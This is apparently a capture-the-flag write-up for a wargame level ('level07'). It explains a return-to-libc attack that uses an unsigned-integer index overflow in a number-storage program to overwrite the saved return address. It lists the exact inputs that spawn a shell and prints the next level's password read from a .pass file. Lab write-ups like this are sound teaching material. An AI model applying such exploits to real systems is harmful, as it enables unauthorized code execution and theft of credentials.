# LEVEL 07

## EXPLANATIONS

### BINARY BEHAVIOR

- functions : store_number, read_number, main
- program asks for inputs in 3 flavors :

  - store : asks number and index
  - read : asks index and outputs number
  - quit => exits the program

- large number stores unsigned int max
  - numbers are considered unsigned int
- index greater that UINT max return error

### EXPLOIT STRATEGY

- return to libc with store function.
- write on main sEIP => 0xffffce7c
- start buf store : 0xffffccb4

  - 456 bytes between the two addresses
  - stores at index _ 4 => 114 _ 4 == 456
  - 114 is protected by % 3 protection on provided indexes
  - exploit with unsigned int overflow
    - 4294967295 / 4 == 1073741823
    - 4294967295 % 4 == 3
      - => (1073741823 + 114) \* 4 = 4294967292 + 456 = 4294967748
      - 4294967748 - 4294967295 (== overflow) = 452 (not 453 because 1st value of the overflow is 0)
        - this overflow is insufficient due to remainder of max unsigned division by 4
      - => (1073741823 + 115) \* 4 = 4294967292 + 460 = 4294967752
      - 4294967752 - 4294967295 (== overflow) = 456

- Find addresses of :

  - Index to overflow 114 : 1073741938
  - system : 0xf7e6aed0 : 4159090384
  - exit : 0xf7e5eb70 : 4159040368
  - "/bin/sh" : 0xf7f897ec : 4160264172

- overwrite sEIP

### RUN COMMAND

---

#### Welcome to wil's crappy number storage service!

```
Commands:
store - store a number into the data storage
read - read a number from the data storage
quit - exit the program
```

---

#### wil has reserved some storage :>

```
Input command: store
Number: 4159090384          <= address system
Index: 1073741938           <= overflow UINT -> 114
Completed store command successfully

Input command: store
Number: 4159040368          <= address of exit
Index: 115
Completed store command successfully

Input command: store
Number: 4160264172          <= address of "/bin/sh"
Index: 116
Completed store command successfully

Input command: quit


$ whoami
level08
$ cd ../level09
/bin/sh: 2: cd: can't cd to ../level09
$ cd ../level08
$ cat .pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```
